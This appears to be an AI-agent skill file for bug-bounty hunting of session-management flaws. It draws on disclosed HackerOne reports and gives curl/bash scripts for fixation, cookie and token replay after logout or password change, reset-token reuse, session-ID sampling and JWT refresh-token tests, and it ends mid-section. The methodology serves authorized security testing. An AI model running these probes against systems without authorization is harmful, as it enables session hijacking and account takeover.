---
name: hunt-session-management
description: "Powerful hunting skill for SESSION MANAGEMENT vulnerabilities, built from 78 full disclosed HackerOne report texts (91-report corpus). Covers the full lifecycle — session fixation / no regeneration on login and password-reset (Shopify #423136, Nextcloud #1181962, Airflow CVE-2023-40273 #2121960), no invalidation on logout (HackerOne #288, Coursera #152080, Shopify #1162443), no invalidation on password/email change and reset-token reuse (Omise #514577/#634488, Paragon #226712, DoD #1069392, Unikrn #272839), static/low-entropy session IDs (DoD #1150573), partial revoke gaps (HackerOne GraphQL #417382, Shopify SSO-disconnect #1547684, Reddit app-revoke #1632186), session token in URL (#341372/#2582/#1197078), and token-theft chains (Rocket.Chat Self-XSS #962902, blind XSS admin-cookie theft #878145/#1036877). Also covers JWT-as-session, refresh-token rotation/reuse-detection, OAuth/SSO session linkage, DBSC downgrade and cookie attributes (Secure/HttpOnly/SameSite/__Host-). MANDATORY FP discipline: TWO real sessions (attacker A + victim B), body-diff every 200, garbage-cookie negative control, cache/IP re-test, OOB confirmation for theft chains. Medium to Critical."
sources: hackerone_public, owasp_wstg, portswigger_research
report_count: 91
full_reports_read: 78
---

## Crown Jewel Targets

Session-management bugs are highest-value when they convert a *stolen, expired, or attacker-planted* credential into a *live authenticated session*. The disclosed corpus is overwhelmingly dominated by one primitive: **the server hands out a session and later forgets to kill it**. `session-attack` appears in **77 of 78** full reports; `cookie-handling` in 36. Prioritise targets where the following hold.

- **No invalidation on password / email change** — the single highest-value class. A stolen session survives the victim's "I think I was hacked, let me reset" recovery. Paragon Initiative Enterprises **#226712** (Critical), Omise **#514577/#634488**, DoD **#1069392**, Unikrn **#272839**, Airflow **CVE-2023-40273 #2121960** and **CVE-2024-45033 #3073507** all turned password change into persistence.
- **Session fixation / no regeneration at an auth boundary** — server accepts a pre-auth or attacker-chosen ID and reuses it after login, password reset, or entering a shared-room password. Shopify **#423136** (fixation escalated via by-design XSS), Nextcloud **#1181962** (talk-room password), Airflow **#2121960**, Password-reset page **#255020**, **#193556** (fixation at logout).
- **Long-lived bearer / API tokens on mobile** that the server never revokes on logout — Shopify `com.shopify.ping` **#1172205** (`atkn_…`, "Missing Logout Token Hint"), Shopile POS Xauth **#1108662**, Reddit app-revoke bypass **#1632186** (Critical), Basecamp flagged cookies **#1024880**.
- **"Revoke session" / device-management features with a blind spot** — HackerOne **#417382** revoked the REST session but forgot **GraphQL** queries; Shopify **#1547684** left an SSO-linked session alive after the provider was disconnected; Reddit **#1632186** resurrected a revoked app session via a chat-invite notification.
- **Static / enumerable session IDs** — DoD **#1150573**: once authenticated you could type another member's session ID and read their PII. Predictable IDs → cross-user ATO without any theft.
- **Session token carried in the URL** — leaks via Referer, browser history, caches, logs. Slack invite URL **#2582** (no expiry, discloses email), **#341372**, **#1197078**, **#17383/#17474/#23579** (stale password-reset links).
- **Token-theft sinks** — XSS/Self-XSS or admin panels that expose the session token: Rocket.Chat **#962902** (`Meteor.loginToken` from server logs → localStorage), Topcoder **#878145** and DoD **#1036877** (blind stored XSS → admin session cookies), 18F/GSA **#263873** (GitHub-linked cookie reuse).
- **Partial-invalidation surfaces** — apps that invalidate only the *acting* session or only the browser that performed the action, leaving sibling sessions alive (the ubiquitous "log in with Chrome and Firefox simultaneously" pattern in **#514577**, **#1069392**, **#273881**, **#223327**).

**Payouts** in the corpus were most often Low/Medium ($40–$1,600) but rose to **Critical** when the bug meant persistent ATO after a security-conscious reset, a revoked-token resurrection, or cross-user PII access. Escalate when MFA/step-up is also absent (e.g. **#2469706** "Session Not Expire / 2FA Bypass"; **#1701378** 2FA bypass via email-confirmation link).

The single highest-frequency actionable takeaway: **capture a real cookie, perform the lifecycle event the victim believes revokes access, and replay the exact old value.** If the body still contains the account's unique identity marker, you have the finding.

---

## Attack Surface Signals

```
# Cookie / token names observed verbatim in the corpus
Set-Cookie: session=...            # sid, sess, JSESSIONID, connect.sid, PHPSESSID,
                                    # laravel_session, federalist.sid
authorization: Bearer atkn_...      # Shopify mobile access token (#1172205)
X-Auth-Token / Xauth                # Shopify POS mobile token, stored in default_user.xml (#1108662)
Meteor.loginToken                   # Rocket.Chat, read from server logs → localStorage (#962902)
X-Phabricator-Csrf: ...             # Phabricator settings/email change (#1271710)

# Lifecycle endpoints — where invalidation is supposed to happen
/login  /logout  /api/v1/logout  /api/logout  /oauth/userinfo  /oauth/token
/settings/sessions  /settings/bounties        # revoke-feature + GraphQL gap (#417382)
/account/change-password  /settings/email  /resetmypassword
/auth/refresh  /api/token/refresh             # refresh-token rotation surface
/studio/invitations?tenantId=...              # state change reachable while "logged out" (#1319892)

# Session-in-URL surfaces — token travels as a parameter or path segment
?sid=  ?session=  ?sessionid=  ?token=  /go/x-xxxx#signup   (#2582, #341372, #1197078)

# Multi-device / linked-provider surfaces
"log in with Chrome and Firefox Simultaneously"   (#514577, #1069392, #273881)
"disconnect external login provider"               (#1547684)
"revoke app access" / "chat invite notification"   (#1632186)
"invite any team member without being logged in"   (#1319892, #1329434)
```

```
# Header signals worth flagging immediately
Set-Cookie: session=abc; Path=/                 # no HttpOnly/Secure/SameSite
Set-Cookie: session=abc; SameSite=None          # None without Secure → flag
Set-Cookie: __Host-sess=...; Secure; Path=/     # GOOD — hard to fixate; absence = Phase 1 precondition
Sec-Session-Registration: ...                   # DBSC in play → test downgrade
X-Amzn-Requestid / X-Amz-Apigw-Id               # API-GW fronting stale session (#1329434)
```

**Host/context signals from the reports:** shared or cybercafe browsers (#952035, #514577), embedded chat widgets whose session is not cleared on logout (#249798, Intercom), direct-download flows that keep pre-provisioned cookies across authentication (#237184), and subdomain-scoped apps (`*.shopifycloud.com`, `*.shopifyapps.com` in #423136) where a sibling-subdomain XSS can plant a fixated ID.

**Content-type note:** auth endpoints vary — `application/json` for REST APIs (`#1172205`, `#417382`), `application/x-www-form-urlencoded` for web forms and mobile proxies (`#1271710`, `#1024880`). Try both if the first response is unexpected.

---

## Discovery Patterns From 78 Full Reports

The 78 full texts share a small set of discovery *methods*, not just targets. The most frequent are: (a) take two browsers and replay cookies — "Here I'm Using 2 Browsers, 1.Chrome (victim Browser) 2.Firefox(attacker browser)" (#1167029); (b) intercept a real request in a proxy and replay it after a lifecycle event (#223327, #417382); (c) export/import cookies with an editor extension (#1162443, #798812, #263873); (d) stumble on the bug while testing an adjacent flow — a notification (#1632186), a shared room (#1181962), or an out-of-scope XSS (#423136). The ranked surfaces below are ordered by how often that method produced a valid finding in the corpus.

### Where Researchers Start (ranked recon surfaces w/ "what to look for")

1. **Login / logout / session-API endpoints** — *what to look for:* the exact cookie or bearer value before and after the call; does `/api/v1/logout` return `"Missing Logout Token Hint"` and silently cancel invalidation (#1172205)? Does the cookie only get cleared client-side while the server keeps it alive (#288, #284)?
2. **Password-change, email-change and password-reset flows** — *what to look for:* sibling sessions still alive after change (#514577, #226712, #1069392); a reset/OTP token requested *before* the change that still works *after* it (#948345, #400826, #17474, #17383, #23579); an old email still granting store access after email change (#952035).
3. **"Revoke session" / device-management UI** — *what to look for:* which request types are actually gated by revoke. HackerOne #417382 revoked GET/POST but forgot GraphQL; Reddit #1632186 let a revoked app session resurrect via a notification tap.
4. **Mobile apps and long-lived API tokens** — *what to look for:* `atkn_` bearer tokens, `Xauth` in `default_user.xml`, `Meteor.loginToken` in localStorage; log off in the app, then replay the captured token against the server (#1172205, #1108662, #1632186, #962902).
5. **SSO / external-login-provider linkage** — *what to look for:* 18F/GSA #263873 (GitHub-linked cookie reuse after logout), Shopify #1547684 (Google-account backdoor survives disconnect), rocket_chat #1701378 (email-confirmation link bypasses 2FA).
6. **Set-Cookie response headers** — *what to look for:* missing `__Host-`/`__Secure-` prefix (the precondition for fixation), missing `HttpOnly`/`Secure`/`SameSite`, identical cookie value pre- and post-auth (#1181962, #193556).
7. **Session token in URL / invite links** — *what to look for:* a valid session URL that never expires and discloses email (#2582), query-string tokens (#341372, #1197078), stale password-reset links (#17474).
8. **XSS / DOM / admin-panel sinks that can read tokens** — *what to look for:* blind stored XSS in contact forms leaking admin session cookies (#878145, #1036877), Self-XSS drag-and-drop leaking `Meteor.loginToken` (#962902).
9. **Two-browser / proxy replay harness** — *what to look for:* the dominant methodology in the corpus — Chrome (victim) + Firefox (attacker), copy cookies, paste, reload (#1167029, #514577, #1069392, #273881, #223327, #347748).
10. **Realtime / widget sessions** — *what to look for:* WebSocket handshake without `Sec-WebSocket-Accept` verification (#3917775) and chat widgets whose session is not cleared on logout (#249798).

The "signal language" in the reports is remarkably consistent and can be grepped for in triage queues:

| Recon surface | Phrase that preceded the finding | Report |
|---------------|----------------------------------|--------|
| Password change | "Failure to invalidate session after password" | #514577, #1069392 |
| Password change | "Change user password wouldn't prevent an already authenticated user" | #2121960 |
| Reset link | "All previous password reset links should automatically expire" | #17474, #17383 |
| Logout | "Cookies are used ... should expire once the user logs out" | #284, #288 |
| Logout | "despite a logout action ... the authentication token is not invalidated" | #1172205 |
| Revoke UI | "you forgot the GraphQL query request" | #417382 |
| SSO disconnect | "disconnect attacker session did not expire" | #1547684 |
| Mobile revoke | "revoked app access ... able to use the previously revoked user account" | #1632186 |
| Guest→auth | "The session id should be renewed once the password is entered" | #1181962 |
| Fixation | "some which use session id do not generate a new session id after logging in" | #423136 |

### Feature-Based Discovery Signals (frequency-ranked table w/ "why it matters / what to probe")

Tag counts are verbatim from the 78-report mining corpus (`session-attack` dominates at 77). Several tags are cross-cutting auto-labels; read them as *where a session bug tended to surface*, not as the weakness itself.

| # | Tag (count) | Why it matters | What to probe |
|---|-------------|----------------|---------------|
| 1 | session-attack (77) | The core primitive — session is created, trusted, and not killed | Diff the session value across every auth/lifecycle boundary |
| 2 | cookie-handling (36) | Cookie is the bearer of the session; client-side clearing ≠ server-side revocation | Capture real cookie, replay after logout/change; diff full Set-Cookie set |
| 3 | server-side-rendering (24) | Stale authenticated content served from a cached/session-backed render | Browser-back after logout (#3062299), replay privileged POST (#216294) |
| 4 | search-filter-sort (17) | Ordinary app features become state-changing sinks while "logged out" | Replay invite/create actions with a dead session (#1319892, #1329434) |
| 5 | brute-otp-reset (16) | Reset/OTP token lifecycle is rarely tied to the password lifecycle | Request reset, change password, then reuse the old reset token (#948345, #400826) |
| 6 | api-endpoint (10) | REST token/logout endpoints expose invalidation gaps | DELETE /api/v1/logout, GET /oauth/userinfo with the old bearer (#1172205) |
| 7 | import-feature (10) | Import/download flows carry pre-provisioned cookies across auth | Check whether cookies are replaced after successful auth (#237184, #3161827) |
| 8 | image-processing (10) | Cross-cutting tag — asset requests ride the session | Replay asset/fetch requests with stale cookies |
| 9 | redirect-handling (10) | Post-auth redirects and session URLs carry the token | Inspect redirect Location for `?sid=`/`#signup` (#2582, #423136) |
| 10 | admin-internal (9) | Admin sessions are the highest-impact theft target | XSS → admin cookie exfil (#878145, #1036877), fixate admin ID (#423136) |
| 11 | subdomain-takeover (8) | Cookie scope crosses sibling subdomains | Test fixation from a writable subdomain; `__Host-` absence (#423136) |
| 12 | cache-layer (8) | Cached/edge 200s mask real logout | Cache-buster + browser-back re-test (#3062299, #347748) |
| 13 | stored (7) | Session state persists server-side past the event | Replay old cookie hours/days later (#216294: 72 hours) |
| 14 | filter-bypass (7) | Auth filters miss GraphQL/WebSocket/realtime paths | Replay GraphQL after revoke (#417382), test WS MITM (#3917775) |
| 15 | proxy-feature (7) | Interception tooling is how researchers find the bug | Replay captured request after changing password (#223327) |
| 16 | csrf (7) | Session-setting/email changes lack token verification | CSRF an email change → ATO (#6907, #15476, #229417) |
| 17 | comment-injection (6) | User-controlled content is a token-leak carrier | Place XSS payload where admin/session data is viewed |
| 18 | subdomain (6) | Multi-subdomain apps share session state | Probe cross-subdomain cookie reuse and fixation |
| 19 | export-feature (6) | Chat/support widgets keep their own session | Log out, check widget conversation persists (#249798) |
| 20 | xml-parser (5) | Mobile token storage files (shared_prefs) | Pull `Xauth`/token, replay after disconnect (#1108662) |
| 21 | public-code-search (4) | Known CVEs reveal the exact non-invalidation pattern | Search advisories → reproduce pattern (#3073507, #2121960) |
| 22 | url-fetching (4) | Tokens transported in fetched/constructed URLs | Grep params for `session`/`token` (#1197078) |

**Long tail (1–3 each):** `sso-oauth`, `blind-oob`, `misconfiguration`, `cors-misconfig`, `json-body`, `debug-error-leak`, `file-upload` (3 each); `template-injection`, `time-based`, `websocket` (2 each); `dom-based`, `self-xss`, `graphql`, `graphql-technique`, `open-redirect`, `template-engine`, `auth-bypass`, `js-source-review`, `internal-network`, `base64-encoding`, `stack-fingerprinting` (1 each). These map to specialised sub-tests in Phases 4 and 8 below.

**How to read this table:** the counts are *co-occurrence tags* the mining pipeline attached to each report, not severity scores. `session-attack` (77/78) is effectively "every report," so it is a scope marker rather than a discriminator. The useful signal is in the mid-frequency rows: `brute-otp-reset` (16) almost always means a stale reset/OTP token (#948345, #400826, #17474); `api-endpoint` (10) almost always means a REST bearer or logout endpoint that did not revoke (#1172205, #417382); `cache-layer` (8) and `redirect-handling` (10) are where a "fixed" logout silently fails (#3062299, #2582). Cross-cutting tags like `image-processing` and `server-side-rendering` are noise for *weakness class* but still point at the request that carried the stale session — replay that request.

### Verbatim Discovery Clues (18 real `[#id]` quotes)

- `[#423136]` "Normally Session Fixation is boring but I discovered a way to simply use by-design XSS to authenticate as a user on those affected apps."
- `[#423136]` "Looking further I realized some which use session id do not generate a new session id after logging in."
- `[#226712]` "While I was testing your web application "Paragon Initiative Enterprises", I came to know that it is vulnerable to "Broken Authentication and Session Management > Failure to Invalidate Session > On Password Reset" at https://bridge."
- `[#417382]` "I have found an Insufficient Session Expiration on implementation of the new `Revoke user session` feature of HackerOne here: https://hackerone."
- `[#1632186]` "I clicked on that and I was surprised that I was able to use the previously revoked user account again in the Reddit app."
- `[#216294]` "I observed session tokens remaining valid even 72 hours after being issued."
- `[#514577]` "While conducting my researching I discovered that the application Failure to invalidate session after password."
- `[#1069392]` "While conducting my research I discovered that the application Failure to invalidate the session after the password change."
- `[#952035]` "Try opening your shop and logging in with your old email (here I was directed to enter and still have full access, even after changing my email address)."
- `[#250688]` "Also, i discovered, that privilege escalation is possible (it is possible to attack another user account in some cases)."
- `[#878145]` "I was able to submit a blind xss payload through the form which was triggered in backend /admin panel."
- `[#1329434]` "While testing again for the session management related bugs in your application, i found some session related issue where evil person can easily create new workspace from victims account without being logged in..."
- `[#341372]` "I found that tat the URL transport the Session token and it's a sentive information so Placing session tokens into the URL increases the risk that they will be captured by an attacker."
- `[#19640]` "I was able to replay a cookie of a current active session and hijack that by replaying the cookie."
- `[#1295187]` "While conducting my research I discovered that the application Failed to validate session after password change."
- `[#229417]` "I found that there is some design flaw in the website in Password reset functionality."
- `[#148914]` "Hey, I've found a session management issue in CMS Airship [bridge."
- `[#249798]` "While testing i look for session related issues but It seems that The Site is Will protected For such problems But a little Issue related to that i wanted to mention here."

**How to read these clues:** the phrases are verbatim, including typos, so they double as search strings when triaging a large program's disclosed reports or your own notes. Three recurring mindsets matter: *"I was surprised that..."* (#1632186 — test the thing that should have been revoked), *"Normally Session Fixation is boring but..."* (#423136 — escalate a low-severity primitive via an adjacent allowed behaviour), and *"It seems that The Site is Well protected ... But a little Issue"* (#249798 — a small residual gap after the obvious paths are patched is still worth reporting). Two clues are pure methodology: #1271710 "I found vulnerability using phone" and #400826 "I found a broken authentitication vuln" — they remind you to test mobile proxies separately from the web app.

### Probe Checklist (15 concrete probes)

1. Capture the exact `Set-Cookie` value from an anonymous GET of `/login`, then authenticate and diff it (fixation, #423136/#193556).
2. Force an attacker-chosen session ID pre-auth and see whether the server adopts it on login.
3. Log out, then replay the OLD cookie value explicitly against `/api/me` or `/oauth/userinfo` (#288, #1172205).
4. Log in on a second browser, change the password on the first, replay the second session (#514577, #1069392).
5. Change the account email and try logging in with the old email / old linked session (#952035).
6. Request a password-reset token, change password via settings, then use the original reset token (#948345, #400826, #17474).
7. After "Revoke session," replay a captured **GraphQL** query and a WebSocket frame (#417382, #3917775).
8. Revoke an app's access, then trigger a push/chat-invite notification and check the token (#1632186).
9. Disconnect an external login provider (Google/GitHub), then replay the app session (#1547684, #263873).
10. Press the browser **Back** button after logout; check for a cached authenticated page (#3062299).
11. Try a state-changing action (`/studio/invitations`, workspace create) with a cookie from a logged-out session (#1319892, #1329434).
12. Collect 200+ fresh session IDs; sort for sequential deltas and decode for embedded userId/timestamp (#1150573).
13. Decode a captured JWT — check `exp`, `jti`; logout then replay the same token; rotate a refresh token and replay the old one.
14. Strip DBSC proof headers (`Sec-Session-Id`) and replay the plain cookie.
15. Test XSS/Self-XSS sinks for readable tokens (`document.cookie`, `localStorage`, `Meteor.loginToken`) and confirm exfil OOB (#962902, #878145).

**Expected positive signal for each probe** — write these down before you run them, so triage is objective:

| Probe | Positive signal |
|-------|-----------------|
| 1–2 | Post-auth cookie value unchanged, or forced value adopted |
| 3 | Old cookie returns the identity marker after logout |
| 4 | Session B returns the marker after A changes password |
| 5 | Old email / linked session still grants access |
| 6 | Pre-change reset token still changes the password |
| 7 | GraphQL / WebSocket returns data after revoke |
| 8 | Revoked app token works again after a notification |
| 9 | App session survives IdP/provider disconnect |
| 10 | Back button shows an authenticated page |
| 11 | State-changing action succeeds with a dead session |
| 12 | Duplicates, +1 deltas, or decoded userID/timestamp |
| 13 | JWT replays after logout; RT1 replay mints tokens / RT2 survives |
| 14 | Plain cookie accepted without the device-bound proof |
| 15 | OOB callback carries `document.cookie` / `localStorage` data |

---

## Step-by-Step Hunting Methodology

> **Two-session rule.** Every invalidation/fixation claim is proven with TWO concrete sessions captured by a real flow — attacker **A** and victim **B** — never with hardcoded placeholder strings. The corpus's simplest PoCs ("Chrome victim + Firefox attacker, copy cookies, paste, reload" — #1167029) are exactly this rule in practice. Helpers below capture real cookies from `curl`'s Netscape jar.

```bash
TARGET=target.com
JAR_A=$(mktemp); JAR_B=$(mktemp)

# Robust session-cookie extractor: handles #HttpOnly_ prefix lines and any
# cookie name (sid/JSESSIONID/connect.sid/PHPSESSID/federalist.sid/...).
get_cookie () {  # $1=jar  $2=name-regex
  local jar="$1" re="${2:-session|sid|sess|JSESSIONID|connect\.sid|PHPSESSID|federalist\.sid}"
  awk -v re="$re" '
    /^#HttpOnly_/ { sub(/^#HttpOnly_/,""); }
    /^#/ { next }
    NF>=7 && $6 ~ re { print $6"="$7 }
  ' "$jar" | tail -1
}
```

### Phase 0 — Establish the Baseline and the Identity Marker

```bash
# What does a genuinely authenticated response look like? Capture the BODY,
# and pick a unique marker (email, user-id, CSRF token, account name).
curl -s -L -c "$JAR_A" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","password":"CorrectHorse1"}' -o /dev/null
A=$(get_cookie "$JAR_A"); echo "A=$A"
BEFORE=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")
echo "$BEFORE" | head -c 200
```
Every subsequent decision compares against this `BEFORE` body — never status alone.

### Phase 1 — Session Fixation (regeneration-on-login / on-reset / on-room-password)

```bash
# Step 1: grab a pre-auth session the SERVER hands an anonymous client.
curl -s -L -c "$JAR_A" "https://$TARGET/login" -o /dev/null
PRE=$(get_cookie "$JAR_A"); echo "pre-auth: $PRE"

# Step 1b (stronger): can we FORCE an arbitrary ID? (attacker-chosen value)
FIX="session=AAAAdeadbeefAAAA"

# Step 2: authenticate while CARRYING the pre-auth/forced cookie.
curl -s -L -c "$JAR_A" -b "$JAR_A" -X POST "https://$TARGET/login" \
  -d "username=attacker@example.com&password=CorrectHorse1" -o /dev/null
POST=$(get_cookie "$JAR_A"); echo "post-auth: $POST"
AUTH=$(curl -s -L -b "$JAR_A" "https://$TARGET/api/me")
echo "$AUTH" | head -c 200
```
**Decision:** if `POST == PRE` and the value now returns authenticated data → fixation. If the forced `FIX` value is accepted → CRITICAL fixation (no XSS/email needed to plant it). Nextcloud **#1181962** reached the same state when a guest joined a password-protected talk room: "The session id should be renewed once the password is entered." Password-reset pages (**#255020**) and logout (**#193556**) are equally common regeneration gaps.

**FP guard:** a value *change* is not automatically safe — some apps rotate the readable cookie but keep a stable server-side key under a second cookie. Diff the FULL `Set-Cookie` set and confirm the old value is genuinely dead (Phase 2).

### Phase 2 — Invalidation on Logout (cookie replay, sibling sessions, browser-back)

```bash
# Replay A's OLD cookie value explicitly (do NOT reuse the jar — logout may
# have overwritten it). Compare body + code against the authenticated baseline.
AFTER=$(curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]')
echo "AFTER logout: $AFTER"

# Negative control: a garbage cookie must NOT return the same body.
GARBAGE=$(curl -s -L -H "Cookie: session=GARBAGE123" "https://$TARGET/api/me" -w '\n[%{http_code}]')
echo "GARBAGE: $GARBAGE"
```
**FP discipline (mandatory):**
- Don't trust the status code. A cached/edge 200 or generic SPA shell returns 200 for everyone. **Body-diff** `AFTER` against `BEFORE` — real only if `AFTER` still carries A's unique identity marker.
- The garbage-cookie control must FAIL where your "surviving" cookie succeeds, or the endpoint isn't session-gated.
- Re-test after a short delay and from a second IP — some servers lazily expire or pin sessions to IP (HackerOne **#288**: "cookie is cleared from the client side ... but not cleared from the server side"; Coursera **#152080**: usable "after many hours ... about after 1 day").
- Explicitly test the **browser Back button** (#3062299) and a **cache-buster** — a 200 from cache is not a live session.

### Phase 3 — Invalidation on Password / Email Change (persistent-ATO core)

```bash
# A = attacker holding a stolen/old session (here, a test account you control).
# B = the victim session that performs the change.
SESSION_A="$A"
BEFORE=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile")

# B logs in (separate jar = "the victim's browser").
curl -s -L -c "$JAR_B" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' -o /dev/null

# B changes the password.
curl -s -L -b "$JAR_B" -X POST "https://$TARGET/api/change-password" \
  -H 'Content-Type: application/json' \
  -d '{"old_password":"OldPass!1","new_password":"BrandNew!2"}' -o /dev/null

# THE TEST: replay the OLD SESSION_A.
AFTER=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile" -w '\n[%{http_code}]')
echo "AFTER pw-change: $AFTER"
```
Finding confirmed only if `AFTER` returns 200 **and** the body still carries the account's unique data (diff vs `BEFORE`). Repeat for **email-change** (#952035) and **logout-all-devices** — apps frequently invalidate the acting session (B) but not sibling sessions (A). Paragon **#226712** and Omise **#514577** are textbook sibling-survival; Airflow **CVE-2024-45033 #3073507** is the same bug reachable via the CLI reset form.

**Reset-token variant:** request a reset token, change the password through settings, then consume the original token — Courier **#948345**, Weblate **#400826**, Phabricator/Secret/HackerOne **#17474/#23579/#17383** all show the reset token surviving the credential change.

**Severity gate:** if the change-password endpoint also lacks a current-password / MFA step-up, escalate — see rocket_chat **#1701378** (2FA bypass via email-confirmation link) and HackerOne **#2469706** ("Session Not Expire / 2FA Bypass").

### Phase 3b — Reset / OTP Token Lifecycle (the "don't use the link yet" technique)

A recurring pattern in the corpus: request a reset token, deliberately *do not* use it, change the password (or email) through settings, then consume the original token. If it still works, the recovery token outlives the credential change it was supposed to be invalidated by.

```bash
# 1) Request reset token T — capture the link, do NOT click it.
# 2) Change password via the authenticated settings flow.
curl -s -L -b "$JAR_B" -X POST "https://$TARGET/api/change-password" \
  -H 'Content-Type: application/json' \
  -d '{"old_password":"OldPass!1","new_password":"BrandNew!2"}' -o /dev/null
# 3) Consume the ORIGINAL token T. Success = finding.
curl -s -L "https://$TARGET/reset?token=T" -d 'password=ThirdPass!3' -w '\n[%{http_code}]'
```
Evidence: Courier **#948345**, Weblate **#400826**, Phabricator **#17474**, HackerOne **#17383**, Secret **#23579**, polldaddy **#273881**, and the logout-CSRF+reset-chain bypass **#229417** (which combined two already-patched reports, #223329 & #223339, and bypassed both fixes).

### Phase 3c — Sibling-Session Matrix (which session actually dies?)

Map every session you control against every lifecycle action; the corpus repeatedly found the app kills only the acting session.

```bash
# Sessions: A (Chrome), B (Firefox), C (mobile token), D (SSO-linked)
for S in A B C D; do
  for ACTION in logout pw-change email-change revoke-device sso-disconnect; do
    # perform ACTION as B, then probe S -> record marker present/absent
    echo "$S survives $ACTION: $(curl -s -H "Cookie: ${!S}" $TARGET/api/me | grep -c 'victim@example.com')"
  done
done
```
Findings from this matrix: Omise **#514577** (B dies, A survives), Shopify **#952035** (email change, old email still enters store), Shopify **#1547684** (SSO disconnect leaves the linked session), Reddit **#1632186** (revoke resurrected by a notification), Airflow **#2121960** (admin reset leaves the authenticated user live).

### Phase 4 — Authority / Revoke-Feature Bypass (GraphQL, SSO, mobile, partial invalidation)

```bash
# 1) GraphQL: capture a sensitive query, revoke the session in the UI, replay it.
#    HackerOne #417382: POST/GET were gated but the GraphQL endpoint was not.
curl -s -L -H "Cookie: $A" -H 'Content-Type: application/json' \
  -X POST "https://$TARGET/graphql" \
  -d '{"query":"query User_bounty_settings_page { me { email bounties } }"}' \
  -w '\n[%{http_code}]'

# 2) Revoke a linked device/app, then check whether the token still mints data.
#    Reddit #1632186: a chat-invite notification resurrected a revoked app session.

# 3) SSO linkage: log out at the IdP only, replay the app cookie.
#    Shopify #1547684: disconnecting Google left the attacker's session alive.

# 4) Mobile bearer: replay the captured atkn_/Xauth after app logout.
#    Shopify #1172205: DELETE /api/v1/logout -> {"error":"Missing Logout Token Hint"}
curl -s -L -X DELETE "https://$TARGET/api/v1/logout" \
  -H "authorization: Bearer $TOKEN" -w '\n[%{http_code}]'
curl -s -L "https://$TARGET/oauth/userinfo" -H "authorization: Bearer $TOKEN"
```
This phase only covers the *session-layer* binding; hand OAuth `state`/`redirect_uri` code injection to `hunt-oauth`.

### Phase 5 — Cookie Attribute Analysis

```bash
curl -sI -L "https://$TARGET/" | grep -i '^set-cookie'
```
- **HttpOnly** missing → reachable via `document.cookie`. Only a finding **chained to a real XSS/DOM sink** (#962902 `Meteor.loginToken`, #878145/#1036877 admin-cookie theft) — note it, don't report standalone as High.
- **Secure** missing → cleartext HTTP; pair with a network-downgrade chain. Gratipay **#242622** shows the session-hijack risk of an invalid cert / unencrypted subdomain.
- **SameSite** missing/`None` → CSRF reachability; `Lax` is bypassable via sibling-subdomain top-level navigation (Argo CD CVE-2024-22424 class) → hand to `hunt-csrf`.
- **`__Host-`/`__Secure-` prefix absent** → the session can be overwritten/fixated from a subdomain; its presence is the precondition that kills Phase 1 fixation.

### Phase 6 — Session-ID Entropy

```bash
# Collect a LARGE sample (200+) of freshly-issued IDs. -L required: a 302
# /login often sets the cookie on the redirect target, not the first response.
N=200; SAMP=$(mktemp)
for i in $(seq 1 $N); do
  J=$(mktemp)
  curl -s -L -c "$J" "https://$TARGET/login" -o /dev/null
  get_cookie "$J" | cut -d= -f2- >> "$SAMP"
  rm -f "$J"
done
sort "$SAMP" | uniq -d | head            # duplicates = catastrophic reuse
awk '{print length($0)}' "$SAMP" | sort -n | uniq -c
```
Then analyse, don't eyeball: `sort -n` for a steady +1/+N delta; `base64 -d`/hex-decode for embedded userId/timestamp/PID; `ent`/`dieharder` for entropy (NIST SP 800-63B wants ≥64 bits). DoD **#1150573** is the extreme case — IDs were effectively static, letting an authenticated user view any member's PII by substituting the ID.

### Phase 7 — JWT-as-Session & Refresh-Token Rotation/Reuse-Detection

```bash
JWT="eyJ..."  # from Authorization: Bearer or a cookie
b64url(){ local s="${1//-/+}"; s="${s//_//}"; printf '%s' "$s===" | base64 -d 2>/dev/null; }
b64url "$(cut -d. -f1 <<<"$JWT")" | jq .   # header: alg, kid
b64url "$(cut -d. -f2 <<<"$JWT")" | jq .   # claims: exp, iat, sub, jti

# Refresh rotation + reuse-detection
RT1=$(curl -s -L -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' | jq -r '.refresh_token')
R2=$(curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}")
RT2=$(jq -r '.refresh_token' <<<"$R2")
echo "rotated? RT1!=RT2 -> $([ "$RT1" != "$RT2" ] && echo yes || echo NO-ROTATION)"
# Reuse-detection: replay the OLD RT1; then confirm whether RT2 was killed.
curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}" -w '\n[%{http_code}]'
curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT2\"}" -w '\n[%{http_code}]'
```
`exp` missing or years out = no expiry; `jti` missing = no revocation list. No rotation (`RT1==RT2`) = long-lived stealable credential; rotation **without** reuse-detection = leaked-token persistence per the OAuth Security BCP. Alg/kid/key-confusion tampering belongs to `hunt-api-misconfig`.

### Phase 8 — Token-Theft Chains & DBSC Downgrade (OOB confirmation mandatory)

```bash
# Self-XSS / drag-and-drop → token in server logs → localStorage (#962902)
# Blind stored XSS in a contact form → admin session cookies (#878145, #1036877)
# Confirm exfil OUT-OF-BAND (Collaborator / XSS-hunter callback), never by assertion.

# DBSC downgrade: strip device-bound proof, replay the plain cookie.
curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]'
# If the plain (non-bound) cookie is still accepted → device-binding is advisory.
```
Also inspect pre-auth/download flows that keep the same cookies across authentication (#237184) and chat widgets whose session is never cleared on logout (#249798).

### Phase 9 — Simultaneous Logon & "Logged Out" State-Changing Actions

Not every session bug is a replay — some are *authorization* bugs where the app applies session checks to reads but not to writes, or never expires an old session when a new login happens.

```bash
# 1) Simultaneous logon: while logged in as user A, POST credentials for user B.
#    Coinbase #11722: the older account session stays alive.
curl -s -b "$JAR_A" -X POST "https://$TARGET/signin" \
  -d "username=userB&password=..." -o /dev/null
curl -s -b "$JAR_A" "https://$TARGET/api/me"   # is A still there?

